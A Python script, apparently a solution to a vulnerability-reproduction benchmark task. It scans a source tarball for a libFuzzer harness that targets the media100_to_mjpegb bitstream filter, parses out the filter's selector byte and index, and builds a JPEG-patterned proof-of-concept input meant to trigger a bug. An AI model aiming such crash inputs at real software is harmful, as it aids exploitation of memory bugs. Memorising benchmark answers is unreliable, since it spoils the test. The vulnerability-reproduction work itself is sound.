import tarfile
import re


class Solution:
    def solve(self, src_path: str) -> bytes:
        try:
            selector_offset = None
            media_index = None
            min_size = 0
            harness_text = None

            try:
                with tarfile.open(src_path, "r:*") as tf:
                    harness_text = self._find_harness(tf)
            except Exception:
                harness_text = None

            if harness_text:
                data_var = self._find_data_var(harness_text)
                array_name, media_index = self._find_bsf_array_and_index(harness_text)
                if array_name and media_index is not None:
                    selector_offset = self._find_selector_offset(
                        harness_text, data_var, array_name
                    )
                else:
                    selector_offset = None
                min_size = self._find_min_size(harness_text)

            return self._create_poc(selector_offset, media_index, min_size)
        except Exception:
            return self._create_poc()

    def _find_harness(self, tf: tarfile.TarFile) -> str:
        members = tf.getmembers()

        # First pass: prefer files that look like fuzzers
        for member in members:
            if not member.isfile():
                continue
            name_lower = member.name.lower()
            if (
                "fuzz" not in name_lower
                and "fuzzer" not in name_lower
                and "target_" not in name_lower
            ):
                continue
            if not (
                member.name.endswith(".c")
                or member.name.endswith(".cc")
                or member.name.endswith(".cpp")
            ):
                continue
            if member.size > 1024 * 1024:
                continue
            f = tf.extractfile(member)
            if f is None:
                continue
            try:
                text = f.read().decode("utf-8", "ignore")
            except Exception:
                continue
            low = text.lower()
            if "llvmfuzzertestoneinput" in low and "media100" in low:
                return text

        # Second pass: any source file mentioning LLVMFuzzerTestOneInput and media100
        for member in members:
            if not member.isfile():
                continue
            if not (
                member.name.endswith(".c")
                or member.name.endswith(".cc")
                or member.name.endswith(".cpp")
            ):
                continue
            if member.size > 512 * 1024:
                continue
            f = tf.extractfile(member)
            if f is None:
                continue
            try:
                text = f.read().decode("utf-8", "ignore")
            except Exception:
                continue
            low = text.lower()
            if "llvmfuzzertestoneinput" in low and "media100" in low:
                return text

        return None

    def _find_data_var(self, text: str) -> str:
        m = re.search(
            r"LLVMFuzzerTestOneInput\s*\(\s*const\s+uint8_t\s*\*\s*([A-Za-z_]\w*)\s*,\s*size_t",
            text,
        )
        if m:
            return m.group(1)
        m = re.search(
            r"LLVMFuzzerTestOneInput\s*\(\s*const\s+unsigned\s+char\s*\*\s*([A-Za-z_]\w*)\s*,\s*size_t",
            text,
        )
        if m:
            return m.group(1)
        return "data"

    def _find_bsf_array_and_index(self, text: str):
        array_name = None
        media_index = None

        arr_re = re.compile(
            r"static\s+const\s+char\s*\*\s*const\s+(\w+)\s*\[\s*\]\s*=\s*{([^}]*)}", re.S
        )
        for m in arr_re.finditer(text):
            name = m.group(1)
            body = m.group(2)
            names = re.findall(r'"([^"]+)"', body)
            if not names:
                continue
            for idx, nm in enumerate(names):
                if "media100_to_mjpegb" in nm:
                    array_name = name
                    media_index = idx
                    self._bsf_array_len = len(names)
                    return array_name, media_index

        return None, None

    def _find_selector_offset(self, text: str, data_var: str, array_name: str) -> int:
        pattern = re.compile(
            re.escape(data_var)
            + r"\[(\d+)\]\s*%\s*FF_ARRAY_ELEMS\(\s*"
            + re.escape(array_name)
            + r"\s*\)"
        )
        m = pattern.search(text)
        if m:
            try:
                return int(m.group(1))
            except ValueError:
                pass

        pattern2 = re.compile(
            re.escape(array_name)
            + r"\s*\[\s*"
            + re.escape(data_var)
            + r"\[(\d+)\]\s*%\s*[^]]+\]"
        )
        m = pattern2.search(text)
        if m:
            try:
                return int(m.group(1))
            except ValueError:
                pass

        return 0

    def _find_min_size(self, text: str) -> int:
        min_size = 0
        for m in re.finditer(r"if\s*\(\s*size\s*<\s*(\d+)\s*\)", text):
            try:
                v = int(m.group(1))
            except ValueError:
                continue
            if v > min_size:
                min_size = v
        return min_size

    def _create_poc(
        self, selector_offset: int = None, media_index: int = None, min_size: int = 0
    ) -> bytes:
        length = 1025
        if min_size and min_size > length:
            length = min_size
        if selector_offset is not None and selector_offset >= length:
            length = selector_offset + 16
        if length < 64:
            length = 64

        data = bytearray(length)
        self._fill_jpegish(data)

        if selector_offset is not None and media_index is not None:
            if 0 <= selector_offset < length:
                try:
                    data[selector_offset] = media_index & 0xFF
                except Exception:
                    pass

        return bytes(data)

    def _fill_jpegish(self, data: bytearray) -> None:
        n = len(data)
        for i in range(n):
            data[i] = 0

        base_pattern = [
            0xFF,
            0xD8,  # SOI
            0xFF,
            0xE0,  # APP0 marker
            0x00,
            0x10,  # APP0 length
            ord("J"),
            ord("F"),
            ord("I"),
            ord("F"),
            0x00,  # "JFIF\0"
            0x01,
            0x01,
            0x00,  # version, units
            0x00,
            0x01,
            0x00,
            0x01,  # Xdensity, Ydensity
            0x00,
            0x00,  # no thumbnail
            0xFF,
            0xDB,  # DQT
            0x00,
            0x43,  # length
            0x00,  # table id
        ]

        step = 64
        for offset in range(0, n, step):
            for i, b in enumerate(base_pattern):
                pos = offset + i
                if pos >= n:
                    break
                data[pos] = b

        start = max(0, n - 64)
        for pos in range(start, n - 1, 2):
            data[pos] = 0xFF
            data[pos + 1] = 0xD9